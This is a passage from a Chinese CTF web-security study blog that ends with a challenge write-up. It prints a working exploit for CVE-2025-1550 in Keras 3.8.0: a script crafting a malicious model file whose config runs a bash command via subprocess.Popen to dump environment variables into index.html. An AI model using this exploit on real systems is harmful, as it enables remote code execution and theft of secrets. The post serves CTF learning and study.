class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<p>requirements告诉我们keras==3.8.0，查了一下发现存在CVE漏洞。</p>
<p><code>cve-2025-1550</code>，可以参考如下文章复现：</p>
<p><a target="_blank" rel="noopener" href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p>
<p>这里直接给出exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">model_name = <span class="string">&quot;model.keras&quot;</span></span><br><span class="line"></span><br><span class="line">x_train = np.random.rand(<span class="number">100</span>, <span class="number">28</span> * <span class="number">28</span>)</span><br><span class="line">y_train = np.random.rand(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">model = Sequential([Dense(<span class="number">1</span>, activation=<span class="string">&#x27;linear&#x27;</span>, input_dim=<span class="number">28</span> * <span class="number">28</span>)])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)</span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>)</span><br><span class="line">model.save(model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    config = json.loads(f.read(<span class="string">&quot;config.json&quot;</span>).decode())</span><br><span class="line"></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;module&quot;</span>] = <span class="string">&quot;keras.models&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;class_name&quot;</span>] = <span class="string">&quot;Model&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;config&quot;</span>] = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;layers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;class_name&quot;</span>: <span class="string">&quot;function&quot;</span>,</span><br><span class="line">            <span class="string">&quot;config&quot;</span>: <span class="string">&quot;Popen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;module&quot;</span>: <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">            <span class="string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="string">&quot;args&quot;</span>: [[<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;env &gt; index.html&quot;</span>]], <span class="string">&quot;kwargs&quot;</span>: &#123;<span class="string">&quot;bufsize&quot;</span>: -<span class="number">1</span>&#125;&#125;]</span><br><span class="line">        &#125;],</span><br><span class="line">    <span class="string">&quot;input_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]],</span><br><span class="line">    <span class="string">&quot;output_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_read:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zip_write:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> zip_read.infolist():</span><br><span class="line">            <span class="keyword">if</span> item.filename != <span class="string">&quot;config.json&quot;</span>:</span><br><span class="line">                zip_write.writestr(item, zip_read.read(item.filename))</span><br><span class="line"></span><br><span class="line">os.remove(model_name)</span><br><span class="line">os.rename(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&quot;config.json&quot;</span>, json.dumps(config))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Malicious model ready&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>直接刷新index.html即可</p>
<h3 id="攻防世界-CAT"><a href="#攻防世界-CAT" class="headerlink" title="攻防世界 CAT"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> CAT</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/django/django-tutorial.html">Django 教程 | 菜鸟教程</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11480150.html">攻防世界 | CAT - 东坡肉肉君 - 博客园</a></p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>看完全部内容之后，然后可能发现还是不会做题或者遇到一些根本没见过的，这就体现了Web特色了，直接上网搜然后现场做需求，对于很多题目来说就是这样的</p>
<p>而且很多也不是直白的考你某个知识点，很多题目会把一大堆的知识点揉到一起，需要你自己找出来是什么漏洞，或者是自己想需要做什么</p>
<p>然后可以多看看最新的CVE，有些题目会直接出这样一个漏洞然后你网上可能找到个POC就可以跟着做了</p>
<p>代码审计能力很重要，特别是对于各种调用关系，即调用链要分析清楚，这对于做给陌生库的题目来说是很重要的</p>
<p>记得也学学Golang、Java、JavaScript和Rust</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://PureStream108.github.io/project">Pure Stream</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://purestream108.github.io/project/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/">https://purestream108.github.io/project/2025/05/31/Web基础-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://PureStream108.github.io/project" target="_blank">PureStream & Marblue</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Study/">Study</a></div><div class="post-share"><div class="social-share" data-image="/img/purestream.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/06/02/D-3CTF2025-Web%E5%A4%8D%E7%8E%B0/" title="D^3CTF2025 Web复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">D^3CTF2025 Web复现</div></div><div class="info-2"><div class="info-item-1">D^3 CTF2025 Web复现D3CTF-2025-Official-Writeup/D3CTF-2025-Official-Writeup-CN.pdf at main · D-3CTF/D3CTF-2025-Official-Writeup 太几把难了，看了wp发现全都是自己没见过的，正好借着机会学习学习 d3invitation 抓包拦截上传图片过程，发现这边的session_token是一个JWT  然后去解码这个JWT，发现存在base64的内容  base64解码，再对 sessionPolicy 解码后，我们会发现这是生成 STS 临时凭证时使用的 policy 并且仔细观察可以发现这个 policy 应该是依据上传图片的文件名 object_name 动态生成的  然后我们这边可以对policy进行注入，获取到所有权限： 1&quot;*\&quot;]&#125;,&#123;&quot;\Effect\&quot;:\&quot;AlloW\&quot;,\&quot;Action\&quot;:[\&quot;s3:*\&quot;],\&quot;Re...</div></div></div></a><a class="pagination-related" href="/2025/05/25/LitCTF2025-WP-%E5%A4%8D%E7%8E%B0/" title="LitCTF2025 WP&amp;复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">LitCTF2025 WP&复现</div></div><div class="info-2"><div class="info-item-1">LitCTF 2025 Web WP&amp;复现打Parloo杯线下的时候顺手搓了几题，感觉题目质量还是很不错的 多重宇宙日记关键代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;script&gt;    // 更新表单的JS提交    document.getElementById(&#x27;profileUpdateForm&#x27;).addEventListener(&#x27;submit&#x27;, async function(event) &#123;        event.preventDefault();        const statusEl = document.getElementById(&#x27;updateStatus&#x27;);        const currentSettingsEl = document.g...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/25/0xGame2025-Official-Web/" title="0xGame2025 Official Web"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-25</div><div class="info-item-2">0xGame2025 Official Web</div></div><div class="info-2"><div class="info-item-1">0xGame2025 Web</div></div></div></a><a class="pagination-related" href="/2025/08/18/MoeCTF2025-Web/" title="MoeCTF2025 Web"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-18</div><div class="info-item-2">MoeCTF2025 Web</div></div><div class="info-2"><div class="info-item-1">MoeCTF2025 Web Wp启动环境需要下载 WebSocket Reflector X 来映射到本地（西电CTF特供）  除了一些不喜欢的（）都可以做 Week100 Web入门指北下载txt文件，说要在控制台输入，那就F12开控制台，输入后回车即可 01 第一章 神秘的手镯F12查看源码，可以发现有JS文件，打开发现flag  02 第二章 初识金曦玄轨查看源码，可以发现让我们查看 /gloden_trail，由提示可知查看请求包，则打开网络再刷新即可看见flag  03 第三章 问剑石！篡天改命！查看源码： 1234567891011121314151617181920212223242526272829303132&lt;script&gt;        async function testTalent() &#123;            try &#123;                const response = await fetch(&#x27;/test_talent?level=B&#x27;, &#123;                ...</div></div></div></a><a class="pagination-related" href="/2025/08/17/LilCTF2025-Web-Wp-%E5%A4%8D%E7%8E%B0/" title="LilCTF2025 Web Wp&amp;复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-17</div><div class="info-item-2">LilCTF2025 Web Wp&amp;复现</div></div><div class="info-2"><div class="info-item-1">LilCTF Web给学满一年的CTFer的CTF对我而言还是太超标了，全靠队友带飞，我会继续努力的（哭）（励志） （题目出的太好了）  ez_bottle由题目这部分可知，需要我们上传zip文件，然后会检测文件内容，合格之后再进行解压 12345678910@post(&#x27;/upload&#x27;)def upload():    zip_file = request.files.get(&#x27;file&#x27;)    if not zip_file or not zip_file.filename.endswith(&#x27;.zip&#x27;):        return &#x27;Invalid file. Please upload a ZIP file.&#x27;    if len(zip_file.file.read()) &gt; MAX_FILE_SIZE:        return &#x27;File size exceeds 1MB. Please upload a smaller ZIP file.&#x27;     ...</div></div></div></a><a class="pagination-related" href="/2025/05/18/%E7%AC%AC%E4%BA%8C%E5%B1%8AParloo%E6%9D%AFWeb-%E9%99%A4%E4%BA%860%E8%A7%A3%E4%B9%8B%E5%A4%96%E7%9A%84Wp/" title="第二届Parloo杯Web 除了0解之外的Wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-18</div><div class="info-item-2">第二届Parloo杯Web 除了0解之外的Wp</div></div><div class="info-2"><div class="info-item-1">Web第一次战斗到最后一刻的比赛….劳累  CatBank | Pure注册2-3个账号，发现能转钱到负数，就直接转给另一个号一百万即可  当时好像要刚好才行，之前超了几分钱就没回显  CatNet | Pure先扫目录:  尝试访问，发现需要本地IP才可以进入，那么直接抓包XFF：  然后看到： 123456function getFlag() &#123;    fetch(&#x27;/admin/flag&#x27;, &#123;        headers: &#123;            &#x27;X-Internal-Auth&#x27;: &#x27;cateye-internal-000&#x27;            &#125;        &#125; 就直接在添加一条X-Internal-Auth: cateye-internal-xxx 然后爆破这个三位数即可  猫猫的秘密 | Pure12345678910111213141516171819202122232425262728293031323334353637383940414243...</div></div></div></a><a class="pagination-related" href="/2025/05/09/mini-L-CTF2025-Web%E5%A4%8D%E7%8E%B0/" title="mini L-CTF2025 Web复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-09</div><div class="info-item-2">mini L-CTF2025 Web复现</div></div><div class="info-2"><div class="info-item-1">Mini L-CTF2025 Web复现好多游戏题，JS和 JAVA啊，一个不会啊，虽然那题Python也不太会（），美美Web爆零，但是做出来一道MISC的JS游戏题，就有点离谱….  Click and Click 一进来是个按钮，要求点到10000次，手点肯定不可能，直接看JS源码，拉到最下面可以发现关键代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162function wn(t, e) &#123;    ce(e, !1);    const r = &quot;/update-amount&quot;;    let n = Wr(e, &quot;count&quot;, 12);    Jr();    var s = mn();    s.__click = [yn, n, r];    var o = Pt(s);    Tr( () =&gt; $r(o, `count i...</div></div></div></a><a class="pagination-related" href="/2025/04/23/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-23</div><div class="info-item-2">JNDI注入</div></div><div class="info-2"><div class="info-item-1">JNDI注入Java漏洞在黑盒实战中的技巧——JNDI注入篇 - FreeBuf网络安全行业门户 JAVA安全之Log4j-Jndi注入原理以及利用方式_log4j jndi-CSDN博客 Java安全之JNDI注入 - nice_0e3 - 博客园 JNDI注入原理及利用考究-先知社区 深入理解JNDI注入与Java反序列化漏洞利用 - 博客 - 腾讯安全应急响应中心 JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展 JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JND...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/lazy.gif" data-original="/img/purestream.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Pure Stream</div><div class="author-info-description">X1cT34m & Web</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU"><i class="fab fa-github"></i><span>请支持LMTX喵</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.mihoyo.com/" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">推：知更鸟，芙宁娜，夏洛蒂，春日野穹，星（崩铁），希儿（崩铁），三无Marblue，朔夜观星，遐蝶，浮波柚叶，二阶堂希罗</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF%C2%B7Web%E5%9F%BA%E7%A1%80%EF%BC%88%E5%B7%B2%E5%AE%8C%E7%BB%93%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">CTF·Web基础（已完结）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#README"><span class="toc-number">1.1.</span> <span class="toc-text">README</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99"><span class="toc-number">1.2.</span> <span class="toc-text">刷题网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.3.</span> <span class="toc-text">常用工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker-Desktop"><span class="toc-number">1.4.</span> <span class="toc-text">Docker Desktop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx"><span class="toc-number">1.5.</span> <span class="toc-text">Nginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP"><span class="toc-number">1.6.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Robots%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.7.</span> <span class="toc-text">Robots协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99"><span class="toc-number">1.8.</span> <span class="toc-text">正则</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ABC"><span class="toc-number">1.8.1.</span> <span class="toc-text">[ABC]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ABC-1"><span class="toc-number">1.8.2.</span> <span class="toc-text">ABC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.8.3.</span> <span class="toc-text">.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s-S"><span class="toc-number">1.8.4.</span> <span class="toc-text">[\s\S]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#w"><span class="toc-number">1.8.5.</span> <span class="toc-text">\w</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#d"><span class="toc-number">1.8.6.</span> <span class="toc-text">\d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#i"><span class="toc-number">1.8.7.</span> <span class="toc-text">&#x2F;i</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%B9%E9%85%8D%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">1.8.8.</span> <span class="toc-text">匹配特殊字符 &#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%AE%9A%E7%AC%A6%E5%8F%B7"><span class="toc-number">1.8.9.</span> <span class="toc-text">限定符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%AA%E5%A9%AA%E5%8C%B9%E9%85%8D%E5%92%8C%E9%9D%9E%E8%B4%AA%E5%A9%AA%E5%8C%B9%E9%85%8D"><span class="toc-number">1.8.10.</span> <span class="toc-text">贪婪匹配和非贪婪匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E7%AC%A6"><span class="toc-number">1.8.11.</span> <span class="toc-text">定位符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9"><span class="toc-number">1.8.12.</span> <span class="toc-text">选择</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp1-exp2"><span class="toc-number">1.8.12.1.</span> <span class="toc-text">exp1(?&#x3D;exp2)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lt-exp2-exp1"><span class="toc-number">1.8.12.2.</span> <span class="toc-text">(?&lt;&#x3D;exp2)exp1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp1-exp2-1"><span class="toc-number">1.8.12.3.</span> <span class="toc-text">exp1(?!exp2)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lt-exp2-exp1-1"><span class="toc-number">1.8.12.4.</span> <span class="toc-text">(?&lt;!exp2)exp1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E5%BC%95%E7%94%A8"><span class="toc-number">1.8.13.</span> <span class="toc-text">反向引用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyPHP"><span class="toc-number">1.9.</span> <span class="toc-text">EasyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%87%BD%E6%95%B0"><span class="toc-number">1.9.1.</span> <span class="toc-text">PHP函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#preg-match"><span class="toc-number">1.9.1.1.</span> <span class="toc-text">preg_match()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#include"><span class="toc-number">1.9.1.2.</span> <span class="toc-text">include()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell-exec"><span class="toc-number">1.9.1.3.</span> <span class="toc-text">shell_exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#parse-str"><span class="toc-number">1.9.1.4.</span> <span class="toc-text">parse_str()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#is-numeric"><span class="toc-number">1.9.1.5.</span> <span class="toc-text">is_numeric</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strrev"><span class="toc-number">1.9.1.6.</span> <span class="toc-text">strrev</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mb-strpos"><span class="toc-number">1.9.1.7.</span> <span class="toc-text">mb_strpos</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mb-substr"><span class="toc-number">1.9.1.8.</span> <span class="toc-text">mb_substr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#putenv"><span class="toc-number">1.9.1.9.</span> <span class="toc-text">putenv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pahinfo"><span class="toc-number">1.9.1.10.</span> <span class="toc-text">pahinfo()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-put-contents"><span class="toc-number">1.9.1.11.</span> <span class="toc-text">file_put_contents()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#addslashes"><span class="toc-number">1.9.1.12.</span> <span class="toc-text">addslashes()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extract"><span class="toc-number">1.9.1.13.</span> <span class="toc-text">extract()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#assert"><span class="toc-number">1.9.1.14.</span> <span class="toc-text">assert()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uniqid"><span class="toc-number">1.9.1.15.</span> <span class="toc-text">uniqid()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#date"><span class="toc-number">1.9.1.16.</span> <span class="toc-text">date()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stream-context-create"><span class="toc-number">1.9.1.17.</span> <span class="toc-text">@stream_context_create()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strcmp"><span class="toc-number">1.9.1.18.</span> <span class="toc-text">strcmp()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extract-1"><span class="toc-number">1.9.1.19.</span> <span class="toc-text">extract()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getallheaders"><span class="toc-number">1.9.1.20.</span> <span class="toc-text">getallheaders()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pos"><span class="toc-number">1.9.1.21.</span> <span class="toc-text">pos()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-reverse"><span class="toc-number">1.9.1.22.</span> <span class="toc-text">array_reverse()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#highlight-file"><span class="toc-number">1.9.1.23.</span> <span class="toc-text">highlight_file()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E8%BE%83"><span class="toc-number">1.9.2.</span> <span class="toc-text">比较</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-number">1.9.2.1.</span> <span class="toc-text">MD5弱比较</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5%E5%BC%B1%E6%AF%94%E8%BE%83%EF%BC%88%E5%88%86%E5%88%AB%E4%B8%BA%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%EF%BC%89"><span class="toc-number">1.9.2.2.</span> <span class="toc-text">MD5弱比较（分别为数字和字母）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5%E5%BC%BA%E7%A2%B0%E6%92%9E"><span class="toc-number">1.9.2.3.</span> <span class="toc-text">MD5强碰撞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SHA1%E5%BC%BA%E7%A2%B0%E6%92%9E"><span class="toc-number">1.9.2.4.</span> <span 